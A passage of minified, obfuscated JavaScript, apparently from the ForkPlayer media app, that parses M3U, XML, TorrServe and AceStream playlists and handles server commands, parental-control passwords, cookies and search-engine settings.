c.typeSource="";if(!returnData)c.source=s;if(gV(pq.elCh,"local")=="html"){c.typeSource="html";$_("ext").style.display="block";$_("ext",'<iframe onerror="" id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+xml_url+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext";return}else if((s.indexOf("<channel>")>0||s.indexOf("<items>")>0)&&s.indexOf('"channels":[')==-1&&s.indexOf('#EXTINF:')==-1){data=lOOlI1IIxvIf1l011Ypr(s);c.typeSource="xml"}else if(apijsUrl==""&&(s.indexOf("#EXTINF:")>-1||s.indexOf("#EXTM3U")>-1)){data=l0IIQIOlZ_I1ll1lYpr(s,xml_url);if(xml_url.indexOf("http://"+getip("torrserve")+"/")===0||xml_url.indexOf("http://"+getip("torrserve2")+"/")===0)c.typeSource="torrserve";else if(data.channels.length)c.typeSource="m3u";else data=lIlI1VBOOlI01QYpr(s)}else if(c.URL_REQUEST.indexOf("45397/MediaServer")>0){maJor.params.set("hms",xml_url.substr(7,xml_url.indexOf(":45397")-1));data=parsehms(s);c.typeSource="hms"}else if(c.URL_REQUEST.indexOf("http://"+getip("torrserve")+"/")===0||c.URL_REQUEST.indexOf("http://"+getip("torrserve2")+"/")===0){data=llO1110jOOOO1Ypr(s,c.URL_REQUEST);c.typeSource="torrserve"}else if(c.URL_REQUEST.indexOf("http://"+getip("acestream")+"/server/api")===0||c.URL_REQUEST.indexOf("http://"+getip("acestream")+"/search")===0){data=ll0lOUdIdIlQl1Ypr(s,c.URL_REQUEST);c.typeSource="acestream"}else if(s.indexOf("<track>")>0&&s.indexOf('<location>')>0){data=parsexspf(s);c.typeSource="xspf"}else{data=lIlI1VBOOlI01QYpr(s);if(data==null){var s1=String(s).replace(/[\r\n]/g,"").match(/^(.*?)([\{\[].*[\}\]])/);if(s1){if(s1[1])kjtYpr.inf(s1[1],600);data=lIlI1VBOOlI01QYpr(s1[2])}}
if(data)c.typeSource="fxml";else if(xml_url.indexOf(".txt")>0){data={channels:lI1111lUEul10IYpr(s)};c.typeSource="txt"}}
if(returnData)return data;if(c.typeSource=="torrserve"&&!status&&!s){var activeTorrserve=null;var secondTorrserve=null;if(maJor.params.get("torrserveactive")){activeTorrserve=getip("torrserve");secondTorrserve=getip("torrserve2")}else if(maJor.params.get("torrserve2active")){activeTorrserve=getip("torrserve2");secondTorrserve=getip("torrserve")}
if(activeTorrserve&&c.lO10111O0001lOl00Ypr.indexOf("http://"+activeTorrserve)===0){maJor.Remote.init()}else if(secondTorrserve&&c.lO10111O0001lOl00Ypr.indexOf("http://"+secondTorrserve)===0){c.lO10111O0001lOl00Ypr=c.lO10111O0001lOl00Ypr.replace(secondTorrserve,activeTorrserve);c.openUrl(pq,c.lO10111O0001lOl00Ypr);return}else{data.before+="<div style='margin:0px 0px 5px 0px;text-align:left;'>Ваш Torrserve оффлайн</div>"}}else if(!data){if(c.l01lI10Il1zvj10lI1Ypr)data={};else{c.ERR=404;data={"title":c.lO10111O0001lOl00Ypr,"before":"<div style='margin-top:30px;margin-left:200px;text-align:left;'><img style='margin-left: -20px;' width='90' src='"+icoerr+"' /><div style='font-weight:bold;font-size:120%;'>Не удается отобразить страницу</div>Проверьте, нет ли опечаток в адресе <span style='font-size:80%;'>"+c.lO10111O0001lOl00Ypr+"</span><br>"+(s!=""?"Исходный код ответа: <br><div style='font-style: italic;margin: 5px;padding: 3px;max-height:110px;overflow-x:hidden;overflow-y:scroll;'><small>"+escapeHtml(s.substr(0,280))+"</small></div>":"")+"<br>Если все правильно, проверьте сеть Интернет или посмотрите в новостях - может сайт сейчас недоступен или на тех. работах<br><br></div>","typeList":"start","channels":[]};data.channels.push({"logo_30x30":"none","position":"hlink","title":"Назад","playlist_url":"cmd:historyback(1);"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Перезагрузить","playlist_url":c.lO10111O0001lOl00Ypr,"description":xml_url+"<br>Нажмите, чтобы открыть ссылку<br> Или нажмите Меню / Добавить в закладки (стартовое меню), чтобы сохранить"});if(s.match(/(<html|<body)/))data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть как HTML","playlist_url":xml_url,"local":"html"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть анонимно","playlist_url":xml_url,"local":"direct"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть через RemoteFork","description":"RemoteFork link<br>_FPNeobhodimRemoteFork_","playlist_url":"http://"+maJor.params.get("remoteip")+"/parserlink?"+encodeURIComponent(xml_url),"local":"direct"});data.icon="err"}
if(gV(pq.elCh,"playlist_url2")&&!pq.pl_serv){if(c.lO10111O0001lOl00Ypr!=pq.elCh.playlist_url2){maJor.statusbar("Загрузка с источника 2..");c.lO10111O0001lOl00Ypr=pq.elCh.playlist_url2;pq.pl_serv=2;c.openUrl(pq,pq.elCh.playlist_url2);return}}
if(gV(pq.elCh,"playlist_url3")&&pq.pl_serv&&pq.pl_serv==2){if(c.lO10111O0001lOl00Ypr!=pq.elCh.playlist_url3){maJor.statusbar("Загрузка с источника 3..");c.lO10111O0001lOl00Ypr=pq.elCh.playlist_url3;pq.pl_serv=3;c.openUrl(pq,pq.elCh.playlist_url3);return}}
if(gV(pq.elCh,"error")){var link=gVs(pq.elCh,"error").replace("%INFO",encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(pq.elCh)));uHelper.create("directnoheader").getI(link)}}else if(c.typeSource=="torrserve"){var tsname="<span style='color: #cbc376;font-size: 20px;'>TORRSERVE";if(c.lO10111O0001lOl00Ypr.indexOf("http://"+getip("torrserve2"))===0)tsname+=" 2";tsname+="</span>";c.global.before="";c.hideRight=1;data.title=gVs(pq.elCh,"title");data.all_logo_30x30="http://staticdata.appfxml.com/staticfiles/google/white/link.png";data.all_poster="none";data.all_information=tsname;data.icon=_img("_ST_torrserve.png");data.css=".site{background: #444a4e;  padding: 0px;}";data.options="hidedescription";if(c.lO10111O0001lOl00Ypr.indexOf("/playlistall/all.m3u")>0)data.title="Активные торренты - Torrserve";data.before="<div style='background: #323637;color: #ffffff;padding: 10px 9px;'><img align=left height=32 src='"+_img("_ST_torrserve.png")+"' /> "+data.title+" "+tsname+"</div>";if(status==401){data.before+="<div style='margin:0px 0px 5px 0px;text-align:left;'>Ошибка 401! Ваш Torrserve требует авторизацию</div>"}}
pq.data=data;c.toChannels(pq)}catch(e){xhr=null;jsshowErr("_FPOshibkaObrabotki_ "+e.message+" / "+encodeURIComponent(xml_url));c.toChannels(pq)}},selfpages:{},lI1QlIlO1zHuo1001Ypr:function(p){var c=this;if(c.l1IOlOIIj1Du1I0lYpr!=null){delete c.l1IOlOIIj1Du1I0lYpr}else{}
if(c.canceled){return}
var ch=p.ch;var tag=p.tag;var pars=ch[tag].split("|");pars[0]=gV(pars,0);pars[1]=gV(pars,1);pars[2]=gV(pars,2);var link=gV(pars,0);if(gV(pars,1)=="selfReNewBookmark"){if(FXMLPage.selfpages[link]){maJor.statusbar("from cache "+pars[0],"link");var a_pq=p.pq;a_pq.selfReNewBookmark={page:FXMLPage.selfpages[link],parse:pars};return p.callback(a_pq)}}
if(is_parse_self(link,gV(l10I0O1I1lRl0QlI1OYpr.page,"lO10111O0001lOl00Ypr"))||gV(pars,1)=="selfReNewBookmark"||gV(ch,"addparserident")==1)
link=maJor.addident(link);c.l1IOlOIIj1Du1I0lYpr=uHelper.create(ch.cors);c.l1IOlOIIj1Du1I0lYpr.parse=function(s){maJor.statusbar("off");is_loadpage(0);if(s===null){if(!c.l1IOlOIIj1Du1I0lYpr.is_remote()){kjtYpr.inf("_FPUse RemoteFork for parse this link_!",1500);maJor.Remote.init()}
if(tag.indexOf("mb")!=0)return;else s=""}
if(s===""&&tag.indexOf("mb")!==0){kjtYpr.inf("Пустая ссылка "+tag+"!",1500);if(handler=="player")vPlayer.lll0Q10I0lI1O0Oll0OOYpr();c.sendStat(-1,p.pq)}else{if(gV(pars,1)=="selfReNewBookmark"){var a_pq=p.pq;a_pq.selfReNewBookmark={"page":c.oncomplete({source:s},this.status,!0),parse:pars};return p.callback(a_pq)}
var text=c.parserstr(pars,s);if(ch.playlist_url){if(ch.playlist_url.indexOf("=postmd5")>0){ch.postmd5=text;text="postmd5"}else if(text.length>9000&&ch.playlist_url.indexOf("#POST")==-1)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки страницы!",1500);ch.playlist_url=ch.playlist_url.replace("md5orighash",text);if(tag.indexOf("mb")==0)ch.playlist_url=ch.playlist_url.replace("md5mbhash",encodeURIComponent(text));else ch.playlist_url=ch.playlist_url.replace("md5hash",encodeURIComponent(text))}
if(ch.stream_url){if(ch.stream_url.indexOf("=postmd5")>0){ch.postmd5=text;text="postmd5"}else if(text.length>9000&&ch.stream_url.indexOf("#POST")==-1)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки ссылки!",1500);if(ch.stream_url.indexOf("#POST")>0)text=encodeURIComponent(text);if(tag.indexOf("mb")==0)ch.stream_url=ch.stream_url.replace("md5mbhash",text);else ch.stream_url=ch.stream_url.replace("md5hash",text)}
ch[tag]="";var a_pq=p.pq;a_pq.elCh=ch;p.callback(a_pq)}}
c.l1IOlOIIj1Du1I0lYpr.get(link)},parserstr:function(pars,s){var x1=-1,x2=-1;if(pars[2]==""&&pars[1]=="")var text=s;else if(pars[1]=="RegExp"||pars[1]=="regexp"){s=s.replace(/\n/g,"").replace(/\r/g,"");try{regexp=new RegExp(pars[2],(pars[3]||""));items=regexp.exec(s);var ind=parseInt(pars[4])||0;if(isNaN(ind))ind=0;text=items[ind]}catch(e){jsshowErr("Parse RegExp error "+lParams.parser+" failed: "+e.message)}}else if(pars[1].indexOf(".*?")>=0||pars[2].indexOf(".*?")>=0){s=s.replace(/\n/g,"").replace(/\r/g,"");try{pg=pars[1]+'(.*?)'+pars[2];regexp=new RegExp(pg,"i");items=regexp.exec(s);text=items[1]}catch(e){jsshowErr("RegExp Parse error "+lParams.parser+" failed: "+e.message)}}else{x1=(pars[1]=="")?0:s.indexOf(pars[1]);if(x1>-1)x1+=pars[1].length;else return"";x2=(pars[2]=="")?-2:s.indexOf(pars[2],x1);if(x2==-2)text=s.substr(x1);else if(x2==-1)return"";else text=s.substr(x1,x2-x1)}
return text},adv:function(el){var c=this;var adstag=el.advertising||c.global.advertising;if(!adstag||!adstag.tag)return 0;c.rek_type=adstag.client||"vast";if(adsPage.is_show_rek(el)){return adsPage.llOIO1vwKiyIOOO1lYpr(adstag.tag,c.rek_type,el)}
return 0},dataconfirm:null,getObjLen:function(obj){var size=0;for(var key in obj){if(obj.hasOwnProperty(key)){var val=obj[key];if(typeof val!=="string")val=String(val);size+=key.length+val.length}}
return size},setCookie:function(host,cook){var dm=(host||"").match(rCook);if(dm){dm=dm[3]}else dm="localhost";for(var i in cook){if(!maJor.lO01OO1Ol1HUx00IIllYpr[dm])maJor.lO01OO1Ol1HUx00IIllYpr[dm]={};if(cook[i]===""&&typeof maJor.lO01OO1Ol1HUx00IIllYpr[dm][i]!=="undefined")delete maJor.lO01OO1Ol1HUx00IIllYpr[dm][i];else maJor.lO01OO1Ol1HUx00IIllYpr[dm][i]=cook[i];if(this.getObjLen(maJor.lO01OO1Ol1HUx00IIllYpr[dm])>4000){delete maJor.lO01OO1Ol1HUx00IIllYpr[dm][i];jsshowErr("Setcookie limit for domain "+dm+" "+this.getObjLen(maJor.lO01OO1Ol1HUx00IIllYpr[dm])+" > 4000",4)}}
if(!Il01QllQll("is_private"))maJor.write("storage",l1OOl0I0IASY10lQ10Ypr(maJor.lO01OO1Ol1HUx00IIllYpr),!0)},handlerData:function(pq){var c=this;try{var data=pq.data||{};var curPage=gP();var orig_xml_url=c.lO10111O0001lOl00Ypr;if(data.setcookie)c.setCookie(orig_xml_url,data.setcookie);if(gV(data,"confirm")!==""){var dm=orig_xml_url.match(rCook);var ttl=gV(data.confirm,"title");if(dm!=null)ttl="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+ttl;if(data.confirm.channel){var but=data.confirm.channel.title+"|_FPZakrit_"}else but="_FPZakrit_";var confm=confirmed.create(ttl,"",but);if(data.confirm.channel){confm.fun=[function(){Il01QllQll().navigate(data.confirm.channel)}]}
return 1}
if(gV(data,"info")!==""){var dm=orig_xml_url.match(rCook);if(dm!=null){data.info="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+data.info}
confirmed.create(data.info,null,"_FPZakrit_")}
if(data.notify){var dm=orig_xml_url.match(rCook);if(dm!=null){data.notify=dm[3]+":"+data.notify}
kjtYpr.inf(data.notify,2200)}
if(gV(data.cmd)!=""){var brea=0;if(data.cmd.indexOf("setEpg")==0){fEpg.set_epg(data.cmd);return 1}
if(data.cmd.indexOf("widgets:")===0){maJor.widgets.cmd(data.cmd.substr(8),pq);return 1}
if(data.cmd.indexOf("updateLogin(")>=0){maJor.updateLogin()}
if(data.cmd.indexOf("setID(")>=0){var m=data.cmd.match(/setID\((.*?),(.*?)\)/);if(m==null)kjtYpr.inf("Error format setID. Must be setID(newID,userSignature)",1500);else if(!maJor.user)kjtYpr.inf("Error setID. Must be logged in ForkPlayer",1500);else if(maJor.user.md5!=m[2])kjtYpr.inf("Error userSignature setID",1500);else{kjtYpr.nmc=m[1];confirmed.create("Внимание! Если идентификатор "+kjtYpr.nmc+" все еще используется на каком-то другом устройстве то оно может потерять доступ к приложению. <br> Сменить идентификатор этого устройства на "+kjtYpr.nmc,"_FPAre you sure_?").fun=[function(){if(kjtYpr.nmc.length==12||kjtYpr.nmc.length==14){maJor.writeC("oID",maJor.getId());maJor.write("oID",maJor.getId());maJor.writeC("ID",kjtYpr.nmc);maJor.write("ID",kjtYpr.nmc);maJor.writeC("ID",kjtYpr.nmc);maJor.ID=kjtYpr.serial=kjtYpr.nmc;kjtYpr.inf("OK set ID "+maJor.getId(),2200);maJor.updateLogin();Il01QllQll().reload()}else kjtYpr.inf("Error format ID",1500)}]}
return 1}
if(data.cmd.indexOf("historyclear(")>=0){var m=data.cmd.match(/historyclear\((.*?),(.*?)\)/);if(m==null)kjtYpr.inf("Error format historyclear. Must be historyclear(days,userSignature)",1500);else if(!maJor.user)kjtYpr.inf("Error historyclear. Must be logged in ForkPlayer",1500);else if(maJor.user.md5!=m[2])kjtYpr.inf("Error userSignature historyclear",1500);else{if(m[1]==-1)lO01II111Irn0OI1IlYpr=[];else{var nh=[];for(var i in lO01II111Irn0OI1IlYpr){if(lO01II111Irn0OI1IlYpr[i].time<T.timestamp-3600*24*m[1])nh.push(lO01II111Irn0OI1IlYpr[i])}
lO01II111Irn0OI1IlYpr=nh;maJor.write("history",l1OOl0I0IASY10lQ10Ypr(lO01II111Irn0OI1IlYpr))}}}
if(data.cmd.indexOf("historyback(")>=0){var m=data.cmd.match(/historyback\((.*?)\)/)[1];if(m>0)m*=-1;m--;c.l10I0O1I1lRl0QlI1OYpr.navigateHist(m,data.cmd.indexOf("reload(")>=0);return 1}
if(data.cmd.indexOf("setfon(")>=0){var m=data.cmd.match(/setfon\((.*?)\)/)[1];if(m==-1)var pqm=confirmed.create("Это может улучшить отклик перемещения курсора","Отключить фоновые изображения страниц?");else pqm=confirmed.create("<img style='height:260px;' src='"+getFon(m)+"' />","Change default background image to");pqm.fun=[function(){maJor.params.set("fon",m);c.l1I1IQlO1ZkV1IOOOllYpr()}];return 1}
if(data.cmd.indexOf("info(")>=0){var m=data.cmd.match(/info\((.*?)\)/)[1];confirmed.create(m,c.l10I0O1I1lRl0QlI1OYpr.page.XML_DOMAIN,"OK");return 1}
if(data.cmd.indexOf("removeHist(")>=0){var m=data.cmd.match(/removeHist\((.*?)\)/)[1]}
if(data.cmd.indexOf("replacepage(")>=0){var m=data.cmd.match(/replacepage\((.*?)\)/);curPage.global=c.global;curPage.channels=data.channels;curPage.renderChannels(getSelect(),"update");return 1}
if(data.cmd.indexOf("settitle(")>=0){var m=data.cmd.match(/settitle\((.*?),(.*?)\)/);curPage.channels[m[1]].title=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("setdescription(")>=0){var m=data.cmd.match(/setdescription\((.*?),(.*?)\);/);curPage.channels[m[1]].description=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("reload(")>=0){if(pq.elCh&&pq.elCh.from_menu){return 1}
var m=data.cmd.match(/reload\((.*?)\)/)[1];if(m!=""&&m>0){var xt=c.lO10111O0001lOl00Ypr;setTimeout(function(){if(xt==c.lO10111O0001lOl00Ypr){c.l10I0O1I1lRl0QlI1OYpr.reload()}},1000*m)}else{c.l10I0O1I1lRl0QlI1OYpr.reload()}
return 1}
if(data.cmd.indexOf("stop()")>=0){return 1}
if(brea)return 1}
if(data.error){is_loadpage(0);kjtYpr.inf(data.error,2200);c.sendStat(0,pq);return 1}}catch(e){kjtYpr.popUp("Error data<br>"+e.message,2200)}
return 0},showParrent:function(v){if(maJor.params.get('passwordkey')=="0000")kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /><span style=\"font-size:120%\"><b> _FPParol_ _FPpoumolch_ 0000<b></span><br><i>_FPSmIotk_ _FPparol_ _FPmoV_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> _FPNastroiki_ -> _FPRodKontr_</i>");VK.open({search_on:"_FPDlDostVv_ _FPparol_:",inputId:"unlockpass",type:"password",el:v,oncomplete:function(c){if(c.str=='')return;else if(maJor.params.get('passwordkey')==c.str){maJor.Password=c.str;kjtYpr.inf("_FPDostupRazreshen_!",1000);c.close();Il01QllQll().navigate(c.pq.el);if(maJor.Password=="0000")kjtYpr.popUp("<b><i>_FPVineSmP_</i></b>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}else{kjtYpr.inf("_FPParol_ _FPnePodhodit_!",1000)}
return}})},preOpen:function(pq){var c=this;if(c.detChxxx(pq.elCh)){c.showParrent(pq.elCh);return 1}
if($_(VK.id)==null&&maJor.params.get("third")==0&&(0||pq.elCh.playlist_url.indexOf("searchEngines")==0)&&templic==0&&pq.inputed==null){confirmed.create("Поиск в Интернет может вести на сторонние сайты и плейлисты, нажимая _FPProdolzhit_, вы подтверждаете что несёте ответственность за принятие решений о получении доступа к сторонним сайтам к результатам поиска","Внимание!","Больше не показывать|_FPProdolzhit_").fun=[function(){maJor.params.set("third",2);pq.l10I0O1I1lRl0QlI1OYpr.play()},function(){templic=1;pq.l10I0O1I1lRl0QlI1OYpr.play()}];return 1}
templic=0;var xml_url=pq.elCh.playlist_url;if(xml_url=="menu"){ContextMenu.show("onlymenu");return 1}else if(xml_url=="confirm"){if(gV(pq.elCh,"description")==="")var ttl=pq.elCh.title;else ttl=pq.elCh.description;confirmed.create(ttl).fun=[function(){var el=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(pq.elCh));el.playlist_url=pq.elCh.confirm[0];Il01QllQll().navigate(el)}];return 1}else if(xml_url=="cmdSetSync"){c.l10I0O1I1lRl0QlI1OYpr.navigateHist(-2);return 1}else if(xml_url=="cmdSetSyncImp"){is_loadpage(1);maJor.remoteData.get("http://cloudflare.appfxml.com/browseraccount/?do=fimport&rev=4&&v="+pq.elCh.menu_url,c);return 1}
if(xml_url.match(/^searchEngines(#url|xml)?\|/)){var xc=xml_url.split("|");xml_url=xc[0];pq.inputed={"text":xc[1],"id":""}}
if(pq.elCh.search_on!=""&&pq.inputed==null){if(pq.elCh.search_on=="search"||pq.elCh.search_on=="search_on")pq.elCh.search_on="_FPVvediteText_";VK.open({el:pq.elCh});return 1}
if(xml_url.indexOf("searchEngines")==0&&pq.inputed){if(pq.inputed.text=="")return 1;spider_stat=pq.inputed.text;if(pq.inputed.text.match(/^(http|about:|tosettings|cmd|vk:|www\.|html:\/\/)/)||pq.elCh.playlist_url.indexOf("searchEngines#url")==0){xml_url="cmdEnterlist"}else{se=getVars("start").search;ch=[];function _rds(el){return{"logo_30x30":el.logo,"timeout":10,"position":"list","title":el.title,"iframe":"3","playlist_url":el.url.replace("%s",encodeURIComponent(pq.inputed.text))}}
for(var i=0;i<se.sites.length;i++){if(gV(se.sites[i],"dop")==2)ch.unshift(_rds(se.sites[i]));else if(gV(se.sites[i],"dop"))ch.push(_rds(se.sites[i]))}
if(ch.length==0){is_loadpage(-1);kjtYpr.inf("Нужно сначала _FPAdd a search engine_ в настройках!",1500)}else{c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=xml_url+"|"+pq.inputed.text+"|"+ch[0].playlist_url;pq.data={"title":"Поиск "+pq.inputed.text,"channels":ch};c.toChannels(pq);uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiders#POSTs="+encodeURIComponent(pq.inputed.text))}
return 1}}
if(xml_url.indexOf("cmdEnterlist")==0){if(pq.inputed.text=="")return 1;pq.elCh.type="enterurl";pq.elCh.title=pq.inputed.text;xml_url=pq.inputed.text;if(xml_url.indexOf("//")>0&&xml_url.indexOf("?")==-1&&xml_url.lastIndexOf("/")!=xml_url.length-1&&!xml_url.match(/\/\/.*\//))xml_url+="/";var ttl=xml_url.replace(/^https?:\/\//,"");if(ttl.indexOf("?")>0)ttl=ttl.substring(0,ttl.indexOf("?"));pq.data={"title":ttl,"icon":_img("_ST_emptydoc.png"),"channels":[{"location":kjtYpr.applyenter,"type":"enterurl","title":ttl+"","playlist_url":xml_url}]};c.lO10111O0001lOl00Ypr=c.SAVE_lO10111O0001lOl00Ypr=xml_url;c.toChannels(pq);return 1}
kjtYpr.lastchannels=null;if(c.lO10111O0001lOl00Ypr.indexOf("#submenu")>0&&gV(pq.elCh,"type")=="replace"){kjtYpr.lastchannels=c.channels;var n=pq.l10I0O1I1lRl0QlI1OYpr.get("s",-2);pq.l10I0O1I1lRl0QlI1OYpr.history.pop();var t=pq.l10I0O1I1lRl0QlI1OYpr.get("title");pq.l10I0O1I1lRl0QlI1OYpr.history.pop();if(pq.inputed)pq.elCh.title=t+"["+n+"="+pq.inputed.text+"]";else pq.elCh.title=t+"["+n+"="+pq.elCh.title+"]"}
if(pq.inputed){if(kjtYpr.hardware=="UE32J4500"||!0)pq.inputed.text=parseHtmlEnteties(pq.inputed.text);kjtYpr.lastSearch=pq.inputed.text}
c.REQUEST_XML=xml_url;c.SEARCH_TEMPL=""},getTypePos:function(Ch,index){if(index==null)index=1;if(index>=0){var P=gV(Ch,"position");if(P==""){if(gV(Ch,"tvg-shift")=="99")P="fulleditline";else if(gV(Ch,"tvg-shift")=="98")P="hlink"}
if(P==""&&gV(Ch,"template")!="")P="html"
else if(P=="")P=this.typeList||""}else P="";return P},upPos:function(){var c=this;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0},addGl:function(search_url,p,title,img){if(search_url.indexOf("http")==0){if(search_url.indexOf("%s")==-1)search_url=sU(search_url,"search=%s");var se=getVars("start").search;if(img==null)img="";if(title==null)title="";var ex=lIQlI1lSe1pI1lQIYpr(search_url);if(ex>=0){se.sites[ex].dop=1;kjtYpr.popUp(title+" уже включен в поиск! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}else{var el={"title":title,"url":search_url,"logo":img,"dop":1};var els=se.sites.length;if(els>2)els=2;se.sites.splice(els,0,el);kjtYpr.popUp(title+" установлено вашей поисковой системой! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}
setVars("search",se)}else kjtYpr.popUp(title+" не содержит ссылку!",2000)},addToSearchHist:function(search_url,p,title,img){var c=this;var se=getVars("start").search;if(p==null)p="site";if(img==null)img="";if(title==null)title="";title=title.replace(/<.*?>/,"");var ex=lIQlI1lSe1pI1lQIYpr({"title":title,"url":search_url,"logo":img,"type":p});for(var i=0;i<se.sites.length;i++){if(se.sites[i].dop)last=i}
var t="";if(ex>=0){last++;if(last<ex&&last<se.sites.length){var old=se.sites[ex];se.sites[ex]=se.sites[last];se.sites[last]=old}
if(!se.sites[ex].dop)t="Включите поиск по этому сайту в Поисковые системы или нажмите здесь, чтобы искать по нему с адресной строки!"}else if(c.reallinks>1){if(se.sites.length<4){se.sites.splice(1,0,{"title":title,"url":search_url,"logo":img,"dop":1,"type":p});t=c.XML_DOMAIN+"<br>"+title+" включено в список _FPYour search engines_<br>Отключить или изменить можно в Настройках / Поисковые системы или нажмите сейчас здесь"}else{se.sites.splice(last+1,0,{"title":title,"url":search_url,"logo":img,"type":p});confirmed.create("Включить поиск по этому сайту?<br>"+c.XML_DOMAIN,"_FPYour search engines_","_FPEdit_|_FPEnable_|_FPLater_").fun=[function(){OpenUrl("about:configsearch#edit:sites:"+(last+1))},function(){se.sites[last+1].dop=1;setVars("search",se)}]}}else t="Добавьте поиск по этому сайту в свои Поисковые системы, чтобы искать по нему с адресной строки!";setVars("search",se);if(!c.l01lI10Il1zvj10lI1Ypr&&t!=""){maJor.hint('<img style="float: left; margin: 2px 6px 0px 0px;width: 25px;height: 25px;background: #9e9e9e;" src="'+_img("_ST_page_fav_off_white.png")+'">'+t,"kb5")}
maJor.seSt.push({"url":search_url,"img":img,"title":title,"is_xxx":c.REQUEST_XXX,"text":"","gs":(c.IFRAMES.length?1:0),"count":c.channels.length,"app_cors":(maJor.app_cors?1:0),"rf":(maJor.params.get("remote")&&maJor.params.get("remoteactive")),"acestream":(maJor.params.get("acestreamactive")||maJor.params.get("torrserveactive"))})},l1l1IOI0Cg_0KIIlll0Ypr:function(){if(maJor.params.get("sidebar")=="1"){$_("sidebar").style.display="block";if(!sdbar){var s=maJor.read("bookmarks");if(s!=""){var sd=lIlI1VBOOlI01QYpr(s);if(!sd||!sd.push)sd=[];for(var i=0;i<sd.length;i++){if(sd[i].playlist_url=="bookmarks/toolbar"){sdbar=sd[i].channels;break}}}
var html=""}
if(sdbar){dop="max-width:"+(($_("sidebar").offsetWidth-12-(sdbar.length*8))/sdbar.length).toFixed(0)+"px;";html="";for(var i=0;i<sdbar.length;i++){if(!sdbar[i]||!sdbar[i].title)sdbar.splice(i,1);else{sdbar[i].logo_30x30=sdbar[i].logo_30x30||_img("_ST_emptydoc.png");if(sdbar[i].logo_30x30.indexOf("http")!=0)sdbar[i].logo_30x30=_img("_ST_emptydoc.png");html+="<div id='sdbar"+i+"' title='"+sdbar[i].title.replace(/<.*?>/g,"")+lIlI11I1I_q0000I1Ypr(1,["' onmousemove=\"if(handler=='menu'&&(getSelect()!=-2||sdbarSel!="+i+")) {setSelect(-2);sdbarSel="+i+";linkOver();}\" onclick=\"sdbarSel="+i+";sidebar_play();\" ",""])+"class='sdbar' style='"+dop+"'>"+"<img onerror=\"onImgError(this,'emptydoc');\" width='20' height='16' style='float: left; padding: 0px 3px 0px 0px;' src='"+_img(sdbar[i].logo_30x30)+"' /><div style='margin-top:-1px;margin-left:23px;'>"+sdbar[i].title.replace(/<.*?>/g,"")+"</div></div>"}}
$_("sidebar",html)}
if(html==""){maJor.params.set("sidebar",0);if(getSelect()==-2){setSelect(-1);oInset.listInset()}
maJor.statusbar("_FPBookmark toolbar_ _FPOtkl_! _FPPustayaPapka_")}
sidebar_sel()}else{$_("sidebar").style.display="none"}},lO11II1atQ111llYpr:function(index,m,d){var c=this;if(m!=null)var dop=" "+m+" "+m+"default";else dop="";var chf='<div class="ch default'+dop+(c.ChClass?' '+c.ChClass+'"':'')+'"'+(c.ChStyle?' style="'+c.ChStyle+'"':'')+' id="ch'+index+'"'+gV(d)+' sel="0"'+lIlI11I1I_q0000I1Ypr(1,[' ontouchstart="parent.t_s(event,'+index+');" onmousemove="if(!this.sel) parent.linkOver('+index+',this);" onmousedown="parent.p_d(this,'+index+');" onmouseup="parent.p_u();" onclick="parent.p_c('+index+');"',""]);chf+='>';return chf},renderCh:function(Ch,index,dop){var c=this;var perPage=gV(c.global,"perPage")||startX;Ch.imgsrc=gV(Ch,"imgsrc");if(Ch.imgsrc==""){if(!Ch.logo){if(gV(Ch,"playlist_url")!="")Ch.imgsrc=_img("_ST_open.png");else Ch.imgsrc=_img("_ST_file.png")}else Ch.imgsrc="none"}
if(String(gV(Ch,"imgsrc")).match(/^http:\/\/check(true|false)/)){Ch.imgsrc=_img((Ch.imgsrc=="http://checktrue"?"_ST_checktrue.png":"_ST_checkfalse.png"))}
if(Ch.imgsrc=="none"){Ch.imgsrc=_img("_ST_1px.png")}
var title=Ch.display_title||gV(Ch,"title");if(!Ch.search_on&&(title==""||title==" "))title=gV(Ch,"playlist_url").replace(/^https?:\/\//,"");title=title.toString();if((Ch.search_on||gVs(Ch,"playlist_url").indexOf("payd_")==0)&&gVs(Ch,"value")!==""){if(gVs(Ch,"type")=="select"&&Ch.menu){for(var i in Ch.menu){if(Ch.menu[i].value==Ch.value){title=Ch.menu[i].title;break}}}else{var t=title.match(/^([^<>]*?:)/);if(t&&gVs(Ch,"type")!="replace")title=t[1];else title="";if(gV(Ch,"type")=="password")title+=Ch.value.replace(/./g,"*");else title+=Ch.value}}
